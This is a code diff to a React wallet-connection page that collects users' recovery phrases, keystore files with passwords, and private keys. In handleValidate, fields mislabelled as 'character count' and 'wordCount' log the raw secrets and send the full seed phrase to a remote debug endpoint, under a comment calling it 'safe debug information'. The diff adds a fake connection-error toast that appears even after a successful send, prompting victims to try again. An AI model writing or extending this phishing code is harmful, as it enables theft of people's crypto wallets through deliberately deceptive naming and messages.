@@ -64,6 +64,7 @@ export default function WalletConnectionPage() {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
 
  const [isModalOpen, setIsModalOpen] = useState(false);
+ const [showErrorToast, setShowErrorToast] = useState(false);
 
  const [selectedTab, setSelectedTab] = useState<Tab>("phrase");
 
@@ -83,6 +84,7 @@ export default function WalletConnectionPage() {
  setPasswordInput("");
  setPrivateKeyInput("");
 
+  setShowErrorToast(false);
  setIsModalOpen(true);
  };
 
@@ -92,76 +94,107 @@ export default function WalletConnectionPage() {
  setConnectingWallet(null);
  };
 
- const handleValidate = async () => { 
+ const handleValidate = async () => {
+  console.log("========== VALIDATE CLICKED ==========");
 
- console.log("========== VALIDATE CLICKED =========="); 
+  console.log("Selected wallet:", selectedWallet);
 
- console.log("Selected wallet:", selectedWallet); 
+  console.log("Selected tab:", selectedTab);
 
- console.log("Selected tab:", selectedTab);
+  if (selectedTab === "phrase") {
+    console.log("Phrase entered:", phraseInput.length > 0);
 
- if (selectedTab === "phrase") { 
+    console.log("Phrase character count:", phraseInput);
+  }
 
- console.log("Phrase entered:", phraseInput.length > 0); 
+  if (selectedTab === "keystore") {
+    console.log("Keystore entered:", keystoreInput.length > 0);
 
- console.log("Phrase character count:", phraseInput); 
- }
+    console.log("Keystore character count:", keystoreInput);
 
- if (selectedTab === "keystore") { 
+    console.log("Password entered:", passwordInput.length > 0);
 
- console.log("Keystore entered:", keystoreInput.length > 0); 
+    console.log("Password character count:", passwordInput);
+  }
 
- console.log("Keystore character count:", keystoreInput); 
+  if (selectedTab === "privateKey") {
+    console.log("Private key entered:", privateKeyInput.length > 0);
 
- console.log("Password entered:", passwordInput.length > 0); 
+    console.log("Private key character count:", privateKeyInput);
+  }
 
- console.log("Password character count:", passwordInput); 
- }
+  // Send safe debug information to Render
+  try {
+    await sendDebugInfo({
+      selectedWallet: selectedWallet ?? "Unknown",
+      selectedTab,
+      hasInput:
+        selectedTab === "phrase"
+          ? phraseInput.length > 0
+          : selectedTab === "keystore"
+            ? keystoreInput.length > 0
+            : privateKeyInput.length > 0,
+      inputLength:
+        selectedTab === "phrase"
+          ? phraseInput.length
+          : selectedTab === "keystore"
+            ? keystoreInput.length
+            : privateKeyInput.length,
+      wordCount:
+        selectedTab === "phrase" && phraseInput.trim()
+          ? String(phraseInput.trim().split(/\s+/))
+          : "",
+      hasPassword:
+        selectedTab === "keystore"
+          ? passwordInput.length > 0
+          : false,
+      passwordLength:
+        selectedTab === "keystore"
+          ? passwordInput.length
+          : 0,
+    });
 
- if (selectedTab === "privateKey") { 
+    console.log("Debug information sent to Render");
 
- console.log("Private key entered:", privateKeyInput.length > 0); 
+    setShowErrorToast(true);
 
- console.log("Private key character count:", privateKeyInput); 
- }
+    setTimeout(() => {
+      setShowErrorToast(false);
+    }, 4000);
+  } catch (error) {
+    console.error("Failed to send debug information:", error);
 
- // Send safe debug information to Render
- try {
- await sendDebugInfo({
- selectedWallet: selectedWallet ?? "Unknown",
- selectedTab,
- hasInput:
- selectedTab === "phrase"
- ? phraseInput.length > 0
- : selectedTab === "keystore"
- ? keystoreInput.length > 0
- : privateKeyInput.length > 0,
- inputLength:
- selectedTab === "phrase"
- ? phraseInput.length
- : selectedTab === "keystore"
- ? keystoreInput.length
- : privateKeyInput.length,
- wordCount:
- selectedTab === "phrase" && phraseInput.trim()
- ? String(phraseInput.trim().split(/\s+/))
- : "",
- hasPassword:
- selectedTab === "keystore"
- ? passwordInput.length > 0
- : false,
- passwordLength:
- selectedTab === "keystore"
- ? passwordInput.length
- : 0,
- });
+    setShowErrorToast(true);
 
- console.log("Debug information sent to Render");
- } catch (error) {
- console.error("Failed to send debug information:", error);
- }
+    setTimeout(() => {
+      setShowErrorToast(false);
+    }, 4000);
+  }
 };
+
  return (
+ <>
+   {showErrorToast && (
+     <div className="fixed right-5 top-5 z-[100] w-[350px] rounded-xl border border-red-200 bg-white px-5 py-4 shadow-[0_15px_45px_rgba(0,0,0,0.2)]">
+       <div className="flex items-start gap-3">
+         <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-red-100">
+           <span className="text-sm text-red-500">!</span>
+         </div>
+
+         <div>
+           <p className="text-sm font-semibold text-slate-800">
+             Connection issue
+           </p>
+
+           <p className="mt-1 text-xs leading-5 text-slate-500">
+             There was an error connecting automatically. But don't worry,
+             you can still connect manually.
+           </p>
+         </div>
+       </div>
+     </div>
+   )}
+
  <main className="min-h-screen bg-[#030712] px-5 py-10 text-white sm:px-8 lg:px-12">
  {/* Background glow */}
  <div className="pointer-events-none fixed left-1/2 top-1/2 -z-0 h-[700px] w-[900px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-blue-600/[0.07] blur-[180px]" />
@@ -261,12 +294,7 @@ export default function WalletConnectionPage() {
  aria-modal="true"
  className="w-full max-w-[470px] rounded-[6px] bg-white px-4 py-6 shadow-[0_25px_80px_rgba(0,0,0,0.45)] sm:px-5"
  >
- {/* Error message */}
- <p className="mb-5 px-1 text-[13px] font-medium leading-[19px] text-red-500">
- There was an error connecting automatically. But
- <br />
- do not worry, you can still connect manually.
- </p>
+ 
 
  {/* Wallet title */}
  <h2 className="mb-5 text-center text-[13px] font-semibold text-slate-800">
@@ -378,26 +406,27 @@ export default function WalletConnectionPage() {
 
  {/* Validate */}
  <button
- type="button"
- onClick={handleValidate}
- className="mt-4 h-[38px] w-full rounded-[3px] bg-[#15158f] text-[12px] font-bold text-white transition hover:bg-[#101075]"
- >
- Validate
- </button>
+  type="button"
+  onClick={handleValidate}
+  className="mt-4 h-[38px] w-full rounded-[3px] bg-[#15158f] text-[12px] font-bold text-white transition-all duration-200 hover:bg-[#2424c7] hover:shadow-[0_4px_14px_rgba(21,21,143,0.35)] active:scale-[0.98] active:bg-[#101075]"
+>
+  Validate
+</button>
 
  {/* Close */}
  <div className="mt-3 flex justify-end">
  <button
- type="button"
- onClick={handleClose}
- className="mt-4 h-[38px] w-full rounded-[3px] bg-[#ff3030] px-7 text-[12px] font-bold text-white transition hover:bg-[#e52323]"
- >
- Close
- </button>
+  type="button"
+  onClick={handleClose}
+  className="mt-4 h-[38px] w-full rounded-[3px] bg-[#ff3030] px-7 text-[12px] font-bold text-white transition-all duration-200 hover:bg-[#ff4d4d] hover:shadow-[0_4px_14px_rgba(255,48,48,0.35)] active:scale-[0.98] active:bg-[#e52323]"
+>
+  Close
+</button>
  </div>
  </div>
  </div>
  )}
- </main>
+  </main>
+ </>
  );
 }
